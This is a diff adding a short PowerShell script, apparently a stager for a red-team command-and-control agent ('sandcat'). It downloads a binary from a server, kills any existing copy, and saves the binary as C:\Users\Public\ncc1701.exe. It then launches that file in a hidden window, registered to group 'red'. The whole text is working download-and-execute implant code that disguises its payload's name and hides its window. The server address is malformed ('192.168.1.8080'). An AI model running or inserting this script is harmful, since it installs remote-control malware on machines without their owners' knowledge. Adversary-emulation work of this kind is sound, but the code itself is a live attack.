@@ -1,0 +1,10 @@
+$server="http://192.168.1.8080";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\ncc1701.exe"} | stop-process -f;
+rm -force "C:\Users\Public\ncc1701.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\ncc1701.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\ncc1701.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
